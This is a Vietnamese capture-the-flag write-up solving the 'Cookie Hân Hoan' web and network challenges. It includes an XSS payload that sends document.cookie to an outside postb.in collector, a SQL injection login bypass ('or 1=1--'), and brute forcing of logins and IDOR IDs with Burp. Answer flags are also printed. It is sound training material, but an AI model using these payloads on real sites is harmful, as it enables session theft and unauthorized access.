
# Writeup Cookie Hân Hoan

<br>

![enter image description here](https://cyberlances.files.wordpress.com/2021/10/cookie.png?w=1024)

<br>

| Category |
|:--:|
| Web Exploitation |
| Network |
| Web Basic |

<br> 

## Web Exploitation

### XSS

> Các cậu còn nhớ sự kiện Livestream lần đầu tiên của Hazy , có một số bạn đã nghịch ngợm làm bay màu cái Chatbox. Đố bạn cho bay màu chal12 này đấy

Ở bài này hint đã thể hiện rõ ràng ở tên bài nên mình cũng không cần nghĩ nhiều :v Truy cập vô trang web thì có 1 khung submit duy nhất để mình có thể XSS.

Trước tiên thử chèn `<script>alert(1);</script>` và trang web nhảy lên 1 pop-up hiển thị số 1 . Bắt đầu chèn những đoạn script kì quái vào để lấy cookie của trang web thuii. Trước khi lấy cookie thì cần tạo 1 trang web để mình nhận cookie về, ở đây mình sẽ dùng [postb](https://postb.in/)

Sử dụng payload: 

    <script>
    	window.location = "https://postb.in/b/1638380767571-3227989608421?cookie=" + document.cookie;
    </script>

Quay lại trang postb reload thì thấy hiển thị flag: `FLAG{10c802c9c6afc26769764b5b986d708a}`

###  Misconfiguration

> Chẳng biết vô tình hay cố ý, Gà mắc phải một sai lầm không đáng có trong việc thiết lập cấu hình Web Server.
>
> Từ một lỗ hổng nhỏ tí xíu, Mèo Yang Hồ sẽ tận dụng mọi trí tưởng tượng và kĩ thuật để thâm nhập được sâu hơn.

Đề bài nhắc đến các file cấu hình ẩn + tên bài có thể đoán đc flag được giấu trong các file cấu hình mà người dùng không được truy cập vào. Ở đây mình sử dụng [dirsearch](https://github.com/maurosoria/dirsearch) để quét các file ẩn. 

Sau khi quét thì nó hiện 1 loạt các file rất nhiều, chịu khó lướt trong đó thì sẽ thấy có file **.htaccess** và file **web.config** có màu xanh lá khác bọt trong đống đó nên mình thử truy cập vào 2 file này.

 - Trước hết là **.htaccess** thì nó hiển thị part1 của flag: `Flag{1b283f0725`
 - Tiếp theo là file **web.config** thì nó hiển thị part2 của flag:
   `d536a0f217d89`. Trong file này để ý nó còn 1 file bak nữa, tải về
   file đó và đuổi đuôi .zip để mở file là ra được phần cuối của flag
   `caca7b183}`

**Flag:** `Flag{1b283f0725d536a0f217d89caca7b183}`

### Ét Quy Eo

> Đây là một lỗ hổng rất cơ bản nhưng lại dễ dàng bị bỏ qua trong quá trình phát triển ứng dụng.
>
> Lỗ hổng này nguy hiểm tới mức cho phép các h@cker lấy quyền quản trị của website, thay đổi nội dung, lợi dụng để ăn cắp các thông tin nhạy cảm, hoặc thậm chí làm bàn đạp tấn công chiếm quyền quản trị toàn hệ thống.
> 
> Đây là phương thức tấn công yêu thích của Hacker khi lần đầu tiếp cận với website của bạn

Như tên bài thì mình sẽ tận dụng lỗ hổng SQL injection để lấy dữ liệu của trang web. Đưa vào payload `username=' or 1=1--` và password tùy ý.

**Flag:** `Flag{Fr33_Styl3}`

### The maze runner

> Lạc vào một mê cung với vô vàn những chuỗi kí tự bí ẩn. Vừa chạy vừa phải nghĩ đâu mới manh mối giúp Gà thoát ra.
>
> Hãy giúp Gà một tay nhé?

Trang web toàn các folder với tên dài loằng ngoằng rất nhiều ký tự và flag nằm ở đâu đó trong chỗ folder này. Chưa kể bên trong nó còn rất nhiều folder con tận 5 6 nhánh rất dài. Mình có thời gian thì mình có thể ngồi check tay nhưng để đẩy nhanh việc tìm flag, mình đẩy toàn bộ trang web với lệnh `wget -r http://chal10.web.letspentest.org/`

>![](11.png)

Lệnh -r ở đây là recursive cho phép len lỏi vào các thư mục nhỏ. Để lấy flag nhanh hơn thì mình sử dụng thêm lệnh **grep**: `grep -r ./chal10.web.letspentest.org/ --regexp=FLAG` để trả về các file chứa cụm từ `FLAG`

>![](12.png)

**Flag:** `FLAG{6059e2117ea3eeecdad7faf1e15d16a2}`

### Gatling gun      

> Với chiếc Gatling gun mạnh mẽ trong tay, Mèo Yang Hồ có thể vượt qua bất kì cánh cửa bảo mật nào. Nhưng thật buồn cười là trong tay hắn lại không có một viên đạn nào.
>
> Nếu bạn muốn nghịch súng với Mèo thì hãy đi nhặt đạn ở trong Github của Cookie Hân Hoan nhé.

Truy cập vô link thì thấy 1 form login bao gồm username, password và IP. Theo lời gợi ý thì có vẻ những thông tin đó nằm trong github của **cookiehanhoan**. Việc đầu tiên là tìm được link github đó. Link github này có từ lúc giải bài Discord phần Misc :v 

Quả thật trong [github](https://github.com/cookiehanhoan/HoangTuEch) có 3 list username pass và ip để brute. Lúc này sử dụng Burp để brute thoii. Send request sang `intruder` và vô tab `position`

>![](9.png)

Trước khi brute thử 1, 2 username password và ip bất kì thì thấy trả về kết quả `FLAG{Not_True}`. Có thể dự đoán với những payloads không đúng thì sẽ trả về flag đó, mình vô tab `option` và thêm vào phần `grep-match` value `FLAG{Not_True}` để khi brute sẽ đánh dấu những payloads có value đó và cái nào không có thì chắc là flag rồi :> 

>![](10,png)

Lướt 1 lúc thì thấy payloads này không có dấu tích và mở thử xem thì thấy trả về flag

**Flag:** `FLAG{e6c068faf9241fe9d1f2000516718377}`

### ID'OR1=1

> Một lỗ hổng rất cơ bản! Nhưng nếu nó xảy ra thì hậu quả rất khủng khiếp...

Trang web truy cập đến 1 trang login ID, mình nhập thử 1 vài ID như 1, 2, 3 thì thấy với mỗi ID khác nhau, trang web cho ra 1 thông tin khác nhau. Có vẻ web này đang dính lỗ hổng IDOR - người dùng có thể truy cập tài nguyên tùy ý mà không cần xác thực. Nếu nhập đúng ID, có thể chúng ta sẽ lấy được flag.

Mở Burp và bắt đầu brute ID :v Mình sẽ brute từ 1 đến 3000 trước coi như nào và phần option thì có grep cụm **flag{** để tìm ra id có chứa flag nhanh hơn

>![](14.png)

Đến ID 1337 thì trả về **flag:** `Flag{61cb4a784e83b6109999af6f036b88bf}`

## Network

### Post Office Man

> Anh bưu tá này là một người mà Gà rất tin tưởng. Gà ủy quyền cho anh ấy lên bưu điện, nói chuyện với anh kiểm thư để lấy thư về.
>
> Nếu giấy ủy quyền hợp lệ, anh kiểm thư sẽ giữ lại bản gốc rồi photocopy ra một bản khác để anh bưu tá đem về cho Gà. Để nhỡ trong trường hợp Gà có tức quá xé thư đi thì vẫn có thể lên đây lấy lại.
>
> Đố bạn anh bưu tá sử dụng giao thức email nào để nói chuyện với anh kiểm thư?

Sử dụng Linux để nc tới đường link và port cho sẵn. 

> +OK popper file-based pop3 server ready
>
> Please using USER to login first

Sau khi netcat thì xuất hiện hint là sử dụng pop3 protocol. Vì chưa rõ về command của pop3 nên mình sử dụng trang [web](https://www.suburbancomputer.com/tips_email.htm) này. Sau khi đăng nhập bằng command `USER` thì mình sử dụng `LIST` để liệt kê tất cả chỗ mail mà mình có. Có khoảng 10 cái mail, vậy thì mình sẽ check tay từng mail bằng câu lệnh `RETR <message>`. Đến mail thứ 8 thì sẽ ra **flag:** `Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L}`

### Where is my house?

> DNS CHÍNH LÀ XƯƠNG SỐNG CỦA INTERNET.
>
>Tên miền hay Domain chính là địa chỉ trang web, thứ mà các bạn vẫn hay gõ vào trên thanh địa chỉ trên trình duyệt để đọc báo hay lướt web, xem phim.
>
> Trên Internet mọi máy tính, máy chủ, các thiết bị mạng được kết nối và giao tiếp với nhau thông qua hệ thống cáp mạng chằng chịt và khổng lồ. Các máy tính sẽ được gán cho nhau những dãy số để định danh với nhau gọi là địa chỉ IP. Nói một cách dễ hiểu thì một ai đó muốn ghé thăm nhà bạn thì họ cần phải có địa chỉ nhà. Những dãy số địa chỉ này có độ dài có thể lên đến 12 hoặc 45 kí tự.
>
> Đến mật khẩu 6 kí tự bạn còn không nhớ nổi, vì thế năm 1984 DNS (Domain Name System) được phát minh để giúp bạn kết nối với nhau bằng tên gọi.
> 
> Bạn chỉ cần nhớ letspentest.org thay vì những dãy số khô khan và kì quặc. Khi vừa Enter, hệ thống DNS bắt đầu hoạt động, nó như tấm bản đồ để chỉ cho bạn biết "Hey, cái tên miền của Cookie có địa chỉ IP là X.X.X.X, hãy tới đó mà lấy thông tin đê". DNS cũng trả lời cho bạn biết "X.X.X.X có phải địa chỉ nhà Cookie Hân Hoan hay không"
> 
> DNS cũng chứa các thông tin khác, nó gọi là các bản ghi (Record). Bạn thử tìm xem domain này còn có những bản ghi nào chứa những điều kì quặc không?

Tới bài này thì mình phải sử dụng DNS tool để check record của tên miền `letspentest.org`. Có rất nhiều tool online để sử dụng nên ở đây mình giới thiệu 2 tool mà mình biết là [dnschecker](https://dnschecker.org/all-dns-records-of-domain.php) và [dnsdumpster](https://dnsdumpster.com/). 

>![](13.png)

và flag hiện ngay trước mắt ta :3 `Flag{DNS_A_AAAA_TXT_CNAME}`

### Scan me if you can

> Nếu coi mỗi máy chủ là một ngôi nhà, trước khi xâm nhập vào bên trong, các Hacker phải thực hiện việc thăm dò. Họ xem xét đâu là điểm yếu nhất của ngôi nhà, chỗ nào là điểm mù camera? Chủ nhà hoặc bảo vệ sẽ phản ứng thế nào khi có xuất hiện các dấu hiệu bất thường?
>
> Trong quá trình tìm kiếm lỗ hổng, Hazy thường xem xét ngôi nhà này có bao nhiêu cánh cửa đang mở (Port). Hãy sử dụng công cụ thân quen để "ném đá" vào tất cả các cánh cửa của ngôi nhà.
>
> Biết rằng, cửa sổ được đánh số từ 8100 tới 9100
>
> Dựa vào sự phản hồi bạn sẽ biết được những điều thú vị!

Sử dụng nmap để scan đường link `network-insecure.letspentest.org` thì thấy có cổng 80 và 9003 là cổng mở

>![](15.png)

Theo như đề bài thì cổng cần truy cập ở đây sẽ là cổng 9004, nc tới đường link với port 9004 ta được **flag:** `Flag{Every-Header-Have-It-Own-Meaning}`

## Web Basic

### Hân hoan

> Thấy hộp bánh quy của chú Hazy để hớ hênh trên bàn. Với bản tính nghịch ngợm, Mèo Yang Hồ nhanh tay thêm chút gia vị để biến cuộc đời trở nên hài hước và hân hoan hơn.

Truy cập vào trang web thì nhận được 1 form đăng nhập khá đẹp mắt. Mình view source thì cũng không thấy có gì bất thường. Thử đăng nhập bằng username và password bất kì, ở đây mình sẽ dùng `admin|admin`.
>![](1.png)

Từ gợi ý đề bài thì mình cũng thử check cookie coi có cái gì hân hoan không. 
> ![](2.png)

Check thấy có 1 cookie đang có value là Guest, sửa value thành `CookieHanHoan` và reload lại web

**Flag:** `Flag{Cookies_Yummy_Cookies_Yammy!}`

### Header 401

> Để nhiều loại Trình duyệt và Web Server có thể nói chuyện và hiểu được nhau thì họ phải sử dụng chung một giao thức có tên gọi là HTTP Protocol. Khi người dùng bắt đầu truy cập Web, trình duyệt sẽ chuyển những hành động của họ thành yêu cầu (Request) tới Web Server. Còn Web Server sẽ trả lời (Response) xem có thể đáp ứng hay từ chối cung cấp thông tin cho trình duyệt.
> 
> Ví dụ, bạn Gà muốn LẤY danh sách các thử thách trong cookiearena<chấm>org, ở đường dẫn /challenges bằng TRÌNH DUYỆT Chrome. Trình duyệt của Gà sẽ phải điền vào một cái form mẫu có tên gọi là HTTP Header và gửi đi. Mỗi yêu cầu sẽ được viết trên một dòng, và nội dung của mỗi yêu cầu sẽ phải viết đằng sau dấu hai chấm.
> 
> Hãy đoán xem trong thử thách này có những Header thú vị nào nha

Vô đường link thì thấy 

>![](7.png)

Trang web đang sử dụng GET method và mình thử dùng Burp để đổi method thành POST coi có bắt được gì không.  Web trả về `Missing Basic Authorization Header.` Comment trang source ở trên gợi ý cho chúng ta cần phải có `Authorization`. 

Basic authorization header là 1 loại header để chứa cái token sau khi người dùng đã đăng nhập và cho server định danh được người dùng khi truy cập những endpoint yêu cầu phải có định danh. Cú pháp của nó là `Authorization: Basic <base64(username:password)>`. 

Với thông tin đăng nhập ở trên thì payload đưa vào sẽ là `Authorization: Basic Z2Fjb25sb250b24vY29va2llaGFuaG9hbg==`

>![](8.png)

**Flag:** `Flag{m4g1c@l_h34d3r_xD}`
### JS B***p B***p

> Sau nhiều đêm suy nghĩ về việc làm thế nào để bảo vệ mã nguồn. Cố gắng thoát khỏi ánh mắt soi mói của Mèo Yang Hồ.
>
> Gà chẹp miệng rồi nói: "Đã tới lúc phải cho nó phải thốt lên rằng! WTF!!!"

Truy cập vào đường link thì thấy nó là 1 login form, cần có username password và role. Nhưng mà sao biết được cần điền gì ??? 

Để ý tên bài là JS bíp bíp vậy chắc phải liên quan gì đó đến phần JS của web rồi. Check JS của web thì thấy có tận 4 file toàn các ký tự kì lạ mà mình phải decode bằng JSFuck. Sử dụng các tool online cho tiện thì mình ra được 

    // 1.js
    function verifyUsername(username) {
        if (username != "cookiehanhoan") {
            return false
        }
        return true
    }
    
    // 2.js
    function reverseString(str) {
        if (str === "")
            { return "" }
        else {
            return reverseString(str.substr(1)) + str.charAt(0)
        }
    }
    
    // 3.js
    function verifyPassword(password) {
    	if (reverseString(password) != "dr0Wss@p3rucreSr3pus") {
    		return false
    	}
    	return true
    }
    
    // 4.js
    function verifyRole(role) {
        if (role.charCodeAt(0) != 64) {
            return false;
        }
        if ((role.charCodeAt(1) + role.charCodeAt(2) != 209) && (role.charCodeAt(2) - role.charCodeAt(1) != 9)) {
            return false       
        }       
        if ((role.charCodeAt(3).toString() + role.charCodeAt(4).toString() != "10578") && (role.charCodeAt(3) - role.charCodeAt(4) != 27)) {         
            return false       
        }     
        return true   
    }
Dựa vào phần decode thì mình đoán được 

 - File 1.js:  username = `cookiehanhoan`
 - File 2.js: dựa vào tên và cách chạy function có thể thấy hàm này dùng để đảo ngược chuỗi
 - File 3.js: Chuỗi sau khi đảo là `dr0Wss@p3rucreSr3pus` vậy chuỗi ban đầu phải là `sup3rSercur3p@ssW0rd`
 - File 4.js: Giải mã Role bằng cách chuyển các số đó sang mã ascii và tính tay là ra được `@dmin`

Đăng nhập với tất cả thông tin mà mình vừa tìm được sẽ kiếm được flag

**Flag:** `Flag{JAV-ascript_F*ck}`

### Impossible

> Học lỏm được công thức chế tạo lá chắn tàng hình của Hazy. Gà nhanh chóng đem về xây dựng hệ thống phòng thủ của riêng mình. Liệu nó có làm khó được Mèo Yang Hồ không?

Vô web việc đầu tiên vẫn là check source đã :3 Để ý thấy trong phần JS có 1 cái function check code 

>![](4.png)

Function này sẽ lấy value mà mình nhập trong khung password để check. Lúc này hàm sẽ check nếu như trong passwork mình nhập có cụm `cookiehanhoan` thì nó sẽ thay thế bằng xâu rỗng. Sau khi thay nó sẽ chuyển cái value đó sang Base64 và check với `Y29va2llaGFuaG9hbg==`. Ý tưởng là chèn cụm `cookiehanhoan` vào giữa chính nó :v

Ở đây mình sẽ nhập vào `cocookiehanhoanokiehanhoan` vì khi function thực hiện, nó sẽ xóa đoạn `cookiehanhoan` ở giữa lúc này value nhận vào của nó sẽ là `cookiehanhoan`

**Flag:** `Flag{Javascript_is_not_safe???}`

### Infinite loop

> Cuộc đời luôn là vậy. Một giây trước tưởng đã cùng đường, một giây sau có lại đầy hy vọng. Các chiến binh đã có công cụ mạnh mẽ trong tay, hãy dùng nó để can thiệp dòng chảy.

Bài này cũng có 1 login form và mình thử đăng nhập username và password là `admin|admin` thì trang web sẽ trả về lỗi. View source thì thấy nó trả về rất nhiều response, cứ tầm vài giây là id sẽ được thay đổi. 

>![](5.png)

Tới đây dùng Burp để bắt response. Sau khi login vô và chú ý ở tab `HTTP history` thì thấy được id sẽ nhảy rất nhiều. 

Giờ mình sẽ chuyển request qua `repeater` để quan sát và chỉnh sửa request. Chú ý rằng id nhảy rất nhiều nhưng chỉ chạy từ 1 đến 10 nên mình có thể thử tay từ 1 tới 10

Thử tới id = 6 thì trả về flag

>![](6.png)

**Flag:** `Flag{Y0u_c4ptur3_m3_xD!!!}`

### I am not a robot

> Nếu là người thì cho xem tai, còn nếu là robot thì đứng ở ngoài. Bạn đã bị chặn

Bài này thì có lẽ đã hint rõ ràng từ cái tên rồi. Truy cập vô trang web và chỉnh sửa URL: `http://chal2.web.letspentest.org/robots.txt`

> ![](3.png)

Trang web cho phép truy cập vào path `/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt` và ra flag 

**Flag:** `Flag{N0_B0T_@ll0w}`

### Sause

> Trình duyệt đang rất vất vả để chuyển đổi các đoạn mã thành hình ảnh và màu sắc. Hãy trải nghiệm góc nhìn của trình duyệt nhé!

Bài này view source là thấy luôn flag :v 

**Flag:** `Flag{Web_Sause_Delicious}`

